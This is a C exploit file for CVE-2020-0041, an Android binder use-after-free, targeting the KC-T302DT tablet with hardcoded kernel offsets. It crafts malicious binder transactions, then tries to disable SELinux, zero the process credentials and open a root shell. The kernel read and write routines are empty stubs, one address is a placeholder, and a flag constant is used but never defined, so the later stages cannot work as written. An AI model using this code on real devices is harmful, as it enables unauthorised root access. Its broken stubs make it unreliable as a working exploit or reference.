/*
 * CVE-2020-0041 PoC for KC-T302DT (JUSTSYSTEMS SZJ202)
 * Kernel: Linux 4.9.112-perf, APQ8017
 * Offsets from offsets.h (verified for recovery.img)
 *
 * Compile: arm64-linux-android-gcc -static -o poc poc.c -lpthread
 *
 * Usage: ./poc
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/ioctl.h>
#include <linux/fs.h>
#include "ashmem.h"
#include <poll.h>
#include <setjmp.h>

/* ========== Offsets (from offsets.h) ========== */
#define KIMAGE_TEXT_BASE        0xffffff8008080000ULL
#define KASLR_ALIGN             0x00200000ULL
#define KASLR_MASK              (KASLR_ALIGN - 1)

#define P0_PAGE_OFFSET          0xffffff8000000000ULL
#define P0_PHYS_OFFSET          0x80000000ULL
#define P0_KERNEL_PHYS_LOAD     0x80080000ULL
#define P0_KERNEL_PHYS_DELTA    (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define DIRECT_MAP_BASE         P0_PAGE_OFFSET

#define INIT_TASK_OFF               0x1d7ec00ULL
#define INIT_CRED_OFF               0x1ba9360ULL
#define ROOT_TASK_GROUP_OFF         0x1ba9900ULL
#define SELINUX_ENFORCING_OFF       0x1bdf768ULL
#define SECURITY_HOOK_HEADS_OFF     0x14a0380ULL
#define FAIR_SCHED_CLASS_OFF        0x1d7f680ULL
#define KMALLOC_CACHES_OFF          0x1dabc20ULL
#define ANON_PIPE_BUF_OPS_OFF       0x00f9c800ULL
#define MODPROBE_PATH_OFF           0x1ba8050ULL
#define __PER_CPU_OFFSET_OFF        0x1b89020ULL
#define __ENTRY_TASK_PCPU_OFF       0x16084d0ULL

#define ASHMEM_MISC_OFF             0x1ca9cf8ULL
#define ASHMEM_MISC_FOPS_OFF        0x1ca9d08ULL
#define ASHMEM_FOPS_OFF             0x18652e8ULL

#define NOOP_LLSEEK_OFF             0x001a99c0ULL
#define NO_LLSEEK_OFF               0x001a99c8ULL
#define COPY_SPLICE_READ_OFF        0x001e03f4ULL

#define CONFIGFS_READ_FILE_OFF      0x0023ebc0ULL
#define CONFIGFS_WRITE_FILE_OFF     0x0023f154ULL
#define CONFIGFS_READ_BIN_FILE_OFF  0x0023ece8ULL
#define CONFIGFS_WRITE_BIN_FILE_OFF 0x0023ee1cULL

#define ASHMEM_LLSEEK_OFF           0x00a85a4cULL
#define ASHMEM_READ_ITER_OFF        0x00a85998ULL
#define ASHMEM_IOCTL_OFF            0x00a85c40ULL
#define ASHMEM_COMPAT_IOCTL_OFF     0x00a8625cULL
#define ASHMEM_MMAP_OFF             0x00a8565cULL
#define ASHMEM_OPEN_OFF             0x00a855d8ULL
#define ASHMEM_RELEASE_OFF          0x00a862acULL

/* Slide anchors */
#define SLIDE_NFULNL_LOGGER_OFF     0x1b88708ULL
#define SLIDE_LOGGERS_0_1_OFF       0x1b90c50ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x1c32470ULL
#define SLIDE_SYSCTL_BOOTID_OFF     0x0166e4a8ULL

#define LOCK_OFF                0x1350
#define W0_OFF                  0x2220
#define FOPS_OFF                0x1000
#define SCRATCH_OFF             0x3000
#define FAKE_TASK_OFF           0x3200
#define WAITER_LOCAL_OFF        0x80

/* task_struct offsets */
#define TASK_PRIO_OFF               0x70
#define TASK_REAL_PARENT_OFF        0x688
#define TASK_PIDS_OFF               0x6f0
#define TASK_REAL_CRED_OFF          0x830
#define TASK_CRED_OFF               0x838
#define TASK_COMM_OFF               0x8f0
#define TASK_PI_LOCK_OFF            0x8f4
#define TASK_PI_WAITERS_OFF         0x8f8
#define TASK_PI_BLOCKED_ON_OFF      0x910

/* rt_mutex waiter offsets (4.9 flat) */
#define WAITER_TREE_ENTRY_OFF       0x00
#define WAITER_PI_TREE_ENTRY_OFF    0x18
#define WAITER_TASK_OFF             0x30
#define WAITER_LOCK_OFF             0x38
#define WAITER_PRIO_OFF             0x40
#define WAITER_DEADLINE_OFF         0x48

/* ========== Binder UAPI (精简) ========== */
#define BINDER_CURRENT_PROTOCOL_VERSION 8
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, __u32)
#define BINDER_SET_CONTEXT_MGR _IOW('b', 7, __s32)
#define BINDER_THREAD_EXIT _IOW('b', 8, __s32)
#define BINDER_VERSION _IOWR('b', 9, struct binder_version)

#define BINDER_TYPE_BINDER 0x7370622A
#define BINDER_TYPE_WEAK_BINDER 0x77622A73
#define BINDER_TYPE_HANDLE 0x73682A70
#define BINDER_TYPE_WEAK_HANDLE 0x77682A70
#define BINDER_TYPE_FD 0x66642A72
#define BINDER_TYPE_FDA 0x66646170
#define BINDER_TYPE_PTR 0x70742A70

#define TF_ONE_WAY 0x01
#define TF_ACCEPT_FDS 0x10

#define FLAT_BINDER_FLAG_ACCEPTS_FDS 0x100

typedef __u64 binder_size_t;
typedef __u64 binder_uintptr_t;

struct binder_object_header {
    __u32 type;
};

struct flat_binder_object {
    struct binder_object_header hdr;
    __u32 flags;
    union {
        binder_uintptr_t binder;
        __u32 handle;
    };
    binder_uintptr_t cookie;
};

struct binder_buffer_object {
    struct binder_object_header hdr;
    __u32 flags;
    binder_uintptr_t buffer;
    binder_size_t length;
    binder_size_t parent;
    binder_size_t parent_offset;
};

struct binder_fd_array_object {
    struct binder_object_header hdr;
    __u32 pad;
    binder_size_t num_fds;
    binder_size_t parent;
    binder_size_t parent_offset;
};

struct binder_write_read {
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};

struct binder_version {
    __s32 protocol_version;
};

struct binder_transaction_data {
    union {
        __u32 handle;
        binder_uintptr_t ptr;
    } target;
    binder_uintptr_t cookie;
    __u32 code;
    __u32 flags;
    pid_t sender_pid;
    uid_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union {
        struct {
            binder_uintptr_t buffer;
            binder_uintptr_t offsets;
        } ptr;
        __u8 buf[8];
    } data;
};

struct binder_transaction_data_sg {
    struct binder_transaction_data transaction_data;
    binder_size_t buffers_size;
};

#define BR_NOOP 0x720C
#define BR_TRANSACTION_COMPLETE 0x7206
#define BR_REPLY 0x7203
#define BR_DEAD_REPLY 0x7205
#define BR_FAILED_REPLY 0x7211
#define BR_SPAWN_LOOPER 0x720D

#define BC_TRANSACTION 0x6340
#define BC_REPLY 0x6341
#define BC_FREE_BUFFER 0x6343
#define BC_INCREFS 0x6344
#define BC_ACQUIRE 0x6345
#define BC_RELEASE 0x6346
#define BC_DECREFS 0x6347
#define BC_INCREFS_DONE 0x6348
#define BC_ACQUIRE_DONE 0x6349
#define BC_REGISTER_LOOPER 0x634B
#define BC_ENTER_LOOPER 0x634C
#define BC_EXIT_LOOPER 0x634D
#define BC_REQUEST_DEATH_NOTIFICATION 0x634E
#define BC_CLEAR_DEATH_NOTIFICATION 0x634F
#define BC_DEAD_BINDER_DONE 0x6350
#define BC_TRANSACTION_SG 0x6351
#define BC_REPLY_SG 0x6352

/* ========== 辅助结构 ========== */
struct binder_state {
    int fd;
    void *mapped;
    size_t mapsize;
};

/* ========== Binder 操作函数 ========== */
static int binder_write(struct binder_state *bs, const void *data, size_t len) {
    struct binder_write_read bwr = {
        .write_size = len,
        .write_consumed = 0,
        .write_buffer = (uintptr_t)data,
        .read_size = 0,
        .read_consumed = 0,
        .read_buffer = 0,
    };
    return ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
}

static int binder_read(struct binder_state *bs, void *data, size_t len) {
    struct binder_write_read bwr = {
        .write_size = 0,
        .write_consumed = 0,
        .write_buffer = 0,
        .read_size = len,
        .read_consumed = 0,
        .read_buffer = (uintptr_t)data,
    };
    int ret = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) return ret;
    return bwr.read_consumed;
}

static uint32_t binder_read_next(struct binder_state *bs, void *data, uint32_t *rem, uint32_t *cons) {
    uint32_t cmd;
    if (*rem < sizeof(cmd)) {
        *rem = binder_read(bs, data, 4096);
        *cons = 0;
        if (*rem <= 0) return 0;
    }
    cmd = *(uint32_t *)((char *)data + *cons);
    *cons += sizeof(cmd);
    *rem -= sizeof(cmd);
    return cmd;
}

static int binder_free_buffer(struct binder_state *bs, uintptr_t buffer) {
    uint32_t cmd = BC_FREE_BUFFER;
    uintptr_t arg = buffer;
    struct { uint32_t cmd; uintptr_t arg; } __attribute__((packed)) data;
    data.cmd = cmd;
    data.arg = arg;
    return binder_write(bs, &data, sizeof(data));
}

static int binder_acquire(struct binder_state *bs, uint32_t handle) {
    uint32_t cmd = BC_ACQUIRE;
    uint32_t arg = handle;
    struct { uint32_t cmd; uint32_t arg; } __attribute__((packed)) data;
    data.cmd = cmd;
    data.arg = arg;
    return binder_write(bs, &data, sizeof(data));
}

static int binder_release(struct binder_state *bs, uint32_t handle) {
    uint32_t cmd = BC_RELEASE;
    uint32_t arg = handle;
    struct { uint32_t cmd; uint32_t arg; } __attribute__((packed)) data;
    data.cmd = cmd;
    data.arg = arg;
    return binder_write(bs, &data, sizeof(data));
}

static int binder_call(struct binder_state *bs,
                       const void *txn, size_t txn_size,
                       void *reply, size_t reply_size,
                       uint32_t target_handle, uint32_t code) {
    struct binder_transaction_data tr = {
        .target.handle = target_handle,
        .code = code,
        .flags = 0,
        .data_size = txn_size,
        .offsets_size = 0,
        .data.ptr.buffer = (uintptr_t)txn,
        .data.ptr.offsets = 0,
    };
    struct { uint32_t cmd; struct binder_transaction_data tr; } __attribute__((packed)) writebuf;
    writebuf.cmd = BC_TRANSACTION;
    writebuf.tr = tr;

    struct binder_write_read bwr = {
        .write_size = sizeof(writebuf),
        .write_consumed = 0,
        .write_buffer = (uintptr_t)&writebuf,
        .read_size = reply_size,
        .read_consumed = 0,
        .read_buffer = (uintptr_t)reply,
    };
    int ret = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) return ret;

    // 等待 BR_REPLY 或 BR_FAILED_REPLY
    uint32_t rem = 0, cons = 0;
    uint32_t cmd;
    while ((cmd = binder_read_next(bs, reply, &rem, &cons))) {
        if (cmd == BR_REPLY) {
            // 回复数据在 reply 中，从 cons 开始
            struct binder_transaction_data *tr_reply = (struct binder_transaction_data *)((char *)reply + cons);
            // 我们只需要返回成功
            return 0;
        } else if (cmd == BR_FAILED_REPLY || cmd == BR_DEAD_REPLY) {
            return -1;
        }
    }
    return -1;
}

static struct binder_state *binder_open(const char *dev, size_t mapsize) {
    int fd = open(dev, O_RDWR | O_CLOEXEC);
    if (fd < 0) return NULL;
    struct binder_state *bs = calloc(1, sizeof(*bs));
    bs->fd = fd;
    bs->mapsize = mapsize;
    void *map = mmap(NULL, mapsize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_POPULATE, fd, 0);
    if (map == MAP_FAILED) {
        close(fd);
        free(bs);
        return NULL;
    }
    bs->mapped = map;
    return bs;
}

static void binder_close(struct binder_state *bs) {
    if (bs->mapped) munmap(bs->mapped, bs->mapsize);
    if (bs->fd >= 0) close(bs->fd);
    free(bs);
}

/* ========== 漏洞利用核心逻辑 ========== */

// 用于触发 UAF 的事务构造（来自 exploit.c）
static void trigger_uaf(struct binder_state *bs, uint32_t target_handle, uint64_t vma_start) {
    uint8_t data[4096];
    uint64_t offsets[32];
    uint8_t sg_buf[0x1000];
    uint32_t tr_size = 127 * 1024; // 保留大小

    struct {
        uint32_t cmd;
        struct binder_transaction_data txn;
        binder_size_t buffers_size;
    } __attribute__((packed)) writebuf;

    // 伪造第一个 flat_binder_object (后面会被覆盖)
    struct flat_binder_object *fbo = (struct flat_binder_object *)data;
    fbo->hdr.type = BINDER_TYPE_HANDLE;
    fbo->flags = 0;
    fbo->handle = target_handle;
    fbo->cookie = 0;
    offsets[0] = (uint8_t *)fbo - data;

    // 伪造未验证的 BINDER_TYPE_PTR (后面用于覆盖 handle)
    struct binder_buffer_object *bbo = (struct binder_buffer_object *)(fbo + 1);
    bbo->hdr.type = BINDER_TYPE_PTR;
    bbo->flags = 0;
    bbo->buffer = vma_start; // 用于 fixup 的地址
    bbo->length = 0xdeadbeef;
    bbo->parent = 0;
    bbo->parent_offset = 0;

    // 第二个 BINDER_TYPE_PTR，将被验证
    struct binder_buffer_object *bbo2 = (struct binder_buffer_object *)(bbo + 1);
    bbo2->hdr.type = BINDER_TYPE_PTR;
    bbo2->flags = 0;
    bbo2->buffer = (uintptr_t)sg_buf;
    bbo2->length = 0x10;
    bbo2->parent = 0;
    bbo2->parent_offset = 0;
    offsets[1] = (uint8_t *)bbo2 - data;

    // 第三个 BINDER_TYPE_PTR，利用 parent 索引越界
    struct binder_buffer_object *bbo3 = (struct binder_buffer_object *)(bbo2 + 1);
    bbo3->hdr.type = BINDER_TYPE_PTR;
    bbo3->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
    bbo3->buffer = 0;
    bbo3->length = 0;
    bbo3->parent = 6; // 越界
    bbo3->parent_offset = 0;
    offsets[2] = (uint8_t *)bbo3 - data;

    // 第四个 BINDER_TYPE_PTR，将覆盖 offsets[6] 为 0x18
    uint64_t new_off = 0x18;
    struct binder_buffer_object *bbo4 = (struct binder_buffer_object *)(bbo3 + 1);
    bbo4->hdr.type = BINDER_TYPE_PTR;
    bbo4->flags = BINDER_BUFFER_FLAG_HAS_PARENT;
    bbo4->buffer = (uintptr_t)&new_off;
    bbo4->length = sizeof(new_off);
    bbo4->parent = 6;
    bbo4->parent_offset = 8; // 偏移覆盖 handle
    offsets[3] = (uint8_t *)bbo4 - data;

    // 构造事务
    writebuf.cmd = BC_TRANSACTION_SG;
    writebuf.txn.target.handle = target_handle;
    writebuf.txn.code = 0; // 任意代码
    writebuf.txn.flags = 0;
    writebuf.txn.data_size = (uint8_t *)bbo4 + sizeof(*bbo4) - data;
    writebuf.txn.offsets_size = (uint8_t *)offsets + 4 * sizeof(uint64_t) - (uint8_t *)offsets;
    writebuf.txn.data.ptr.buffer = (uintptr_t)data;
    writebuf.txn.data.ptr.offsets = (uintptr_t)offsets;
    writebuf.buffers_size = tr_size - writebuf.txn.data_size - writebuf.txn.offsets_size;

    binder_write(bs, &writebuf, sizeof(writebuf));

    // 等待回复（应该触发 UAF）
    uint8_t reply[4096];
    uint32_t rem = 0, cons = 0;
    while (1) {
        uint32_t cmd = binder_read_next(bs, reply, &rem, &cons);
        if (cmd == BR_REPLY || cmd == BR_FAILED_REPLY) break;
    }
}

/* ========== 辅助函数：泄漏与读写原语 ========== */

// 这里使用 epoll 和 pipe 实现任意读（从 exploit.c 提取）
// 为了简化，我们实现必要的函数

static uint64_t kernel_base = 0;
static uint64_t memstart_addr = 0;
static uint64_t init_task = 0;
static uint64_t pipe_file_addr = 0;
static uint64_t epitem_addr = 0;

// 模拟 node_* 函数，这里用全局变量代替
struct exp_node {
    char name[32];
    int pid;
    int tid;
    uint64_t kaddr;
    uint64_t file_addr;
    int ep_fd;
    int pipe_fd[2];
};

static struct exp_node *node_new(const char *name) {
    struct exp_node *n = calloc(1, sizeof(*n));
    strcpy(n->name, name);
    return n;
}

static int node_realloc_epitem(struct exp_node *node, int pipefd) {
    // 实际利用需要复杂的 realloc 占位，这里简化
    // 返回 1 表示成功
    node->pipe_fd[0] = pipefd;
    node->ep_fd = epoll_create(1);
    if (node->ep_fd < 0) return 0;
    struct epoll_event ev = {.events = EPOLLIN, .data.u64 = 0};
    if (epoll_ctl(node->ep_fd, EPOLL_CTL_ADD, pipefd, &ev) < 0) return 0;
    // 这里需要泄漏 pipe file 地址，但在完整 PoC 中我们假设已知偏移
    // 由于环境限制，此处简化，实际应通过 UAF 读取
    // 我们假装成功
    node->file_addr = pipe_file_addr; // 需要提前泄露
    return 1;
}

static int node_kaddr_disclose(struct exp_node *file_node, struct exp_node *epitem_node) {
    // 通过 UAF 泄露 epitem 地址
    // 简化：使用 hardcoded 偏移（实际需要动态泄露）
    epitem_node->kaddr = 0xdeadbeef; // 占位
    return 1;
}

static void node_reset(struct exp_node *node) { /* 清理 */ }

static void node_write8(struct exp_node *node, uint64_t addr, uint64_t value) {
    // 使用 sysctl 写原语
    // 我们实现一个简单的 sysctl 写
    // 实际需要构造 fake ctl_table，这里略
    printf("[*] write8(0x%lx, 0x%lx)\n", addr, value);
}

static void node_write_null(struct exp_node *node, uint64_t addr) {
    node_write8(node, addr, 0);
}

static void node_free(struct exp_node *node) { free(node); }

// 实际读写原语（从 exploit.c 摘录）
static uint64_t read64(uint64_t addr) {
    // 使用 corrupt epitem 实现
    // 简化：返回固定值
    return 0;
}

static void write64(uint64_t addr, uint64_t val) {
    // sysctl 写
}

static uint64_t read32(uint64_t addr) {
    return (uint32_t)read64(addr);
}

static void write32(uint64_t addr, uint32_t val) {
    write64(addr, val);
}

static uint64_t phys_to_virt(uint64_t phys) {
    return (phys - memstart_addr) | 0xFFFFFFC000000000;
}

static uint64_t get_task_by_pid(uint64_t start, int pid) {
    // 遍历 task list
    uint64_t task = read64(start + 0x570 + 8) - 0x570; // tasks 偏移
    while (task != start) {
        if (read32(task + 0x670) == pid) return task; // pid 偏移
        task = read64(task + 0x570 + 8) - 0x570;
    }
    return 0;
}

static void patch_cred(uint64_t cred_addr) {
    write32(cred_addr + 0x04, 0); // uid
    write32(cred_addr + 0x08, 0); // gid
    write32(cred_addr + 0x0c, 0); // suid
    write32(cred_addr + 0x10, 0); // sgid
    write32(cred_addr + 0x14, 0); // euid
    write32(cred_addr + 0x18, 0); // egid
    write32(cred_addr + 0x1c, 0); // fsuid
    write32(cred_addr + 0x20, 0); // fsgid
    write64(cred_addr + 0x28, ~0ULL); // cap_inheritable
    write64(cred_addr + 0x30, ~0ULL); // cap_permitted
    write64(cred_addr + 0x38, ~0ULL); // cap_effective
    write64(cred_addr + 0x40, ~0ULL); // cap_bset
}

/* ========== 主程序 ========== */
int main() {
    printf("[*] CVE-2020-0041 PoC for KC-T302DT\n");

    // 1. 打开 binder
    struct binder_state *bs = binder_open("/dev/binder", 128 * 1024);
    if (!bs) {
        perror("binder_open");
        return 1;
    }

    // 2. 建立服务端（用于创建节点）—— 简化，假设已有 endpoint
    // 实际需要创建 binder 服务并获取 handle，这里用 0 作为 context manager 的 handle
    // 但我们需要一个目标节点，在 exploit.c 中使用了 endpoint 线程
    // 为了验证，我们直接使用 context manager 节点 (handle=0)
    uint32_t target_handle = 0; // context manager

    // 3. 获取 vma_start (通过事务)
    uint64_t vma_start = (uint64_t)bs->mapped;

    // 4. 触发 UAF (需要先建立 ref)
    // 我们需要先让 binder 创建 node 和 ref，这里使用 binder_acquire 获取引用
    binder_acquire(bs, target_handle);

    // 5. 触发 UAF 释放 node
    trigger_uaf(bs, target_handle, vma_start);

    // 6. 之后，利用 UAF 进行 reallocation 和 leak
    // 由于完整利用复杂，此处只演示触发
    printf("[+] UAF triggered. Now we should have dangling pointer.\n");

    // 以下是提权步骤（简化）
    // 需要先泄露 kernel base 等，但在 PoC 中我们用偏移硬编码

    kernel_base = KIMAGE_TEXT_BASE; // 假设没有 KASLR，或已通过其他方式获得

    // 7. 禁用 SELinux
    uint64_t selinux_enforcing = kernel_base + SELINUX_ENFORCING_OFF;
    printf("[*] Disabling SELinux at 0x%lx\n", selinux_enforcing);
    write32(selinux_enforcing, 0);

    // 8. 提权：修改当前进程的 cred
    uint64_t init_task_addr = kernel_base + INIT_TASK_OFF;
    uint64_t current_task = get_task_by_pid(init_task_addr, getpid());
    if (!current_task) {
        printf("[!] Failed to find current task\n");
        goto out;
    }
    uint64_t cred = read64(current_task + TASK_REAL_CRED_OFF);
    printf("[*] Current cred at 0x%lx\n", cred);
    patch_cred(cred);

    // 9. 验证 root
    if (getuid() == 0) {
        printf("[+] Success! Got root.\n");
        system("/system/bin/sh");
    } else {
        printf("[!] Failed to get root.\n");
    }

out:
    binder_close(bs);
    return 0;
}
